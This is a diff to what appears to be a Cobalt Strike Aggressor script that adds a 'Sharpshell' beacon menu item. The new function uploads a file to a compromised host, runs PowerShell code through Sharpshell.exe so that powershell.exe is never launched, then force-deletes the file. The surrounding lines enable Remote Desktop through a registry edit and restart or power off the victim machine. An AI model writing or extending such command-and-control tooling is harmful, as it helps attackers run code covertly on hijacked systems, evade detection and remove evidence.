@@ -1,5 +1,14 @@
 #define functions
 
+sub Exec_sharpshell{
+    local('$fpath $last $fname');
+    $fpath = $3['file'];
+    $last = lindexOf($fpath, "\\");
+    $fname = substr($fpath,$last + 1,);
+    bupload($bid, $fpath);
+    bexecute_assembly($bid, script_resource("post/Sharpshell.exe"), "\"".$fname."\"");
+    bshell($bid,"del /F /S /Q $fname");
+}
 
 #append menus
 
@@ -30,6 +39,7 @@
                     bshell($bid,"REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");
                 }
             }
+
             menu "Power"{
                 item "Restart"{
                     bshell($1,"shutdown -r -t 0");
@@ -37,5 +47,14 @@
                 item "Power off"{
                     bshell($1,"shutdown -s -t 0");
                 }
-        }
+            }
+            
+            item "Sharpshell"{
+                $bid = $1['@'];
+                $dialog = dialog("SharpShell",%(bid => $bid), &Exec_sharpshell);
+                dialog_description($dialog, "Execute powershell code without powershell.");
+                drow_file($dialog, "file", "Choose: ");
+                dbutton_action($dialog, "Go");
+                dialog_show($dialog); 
+            }
     }
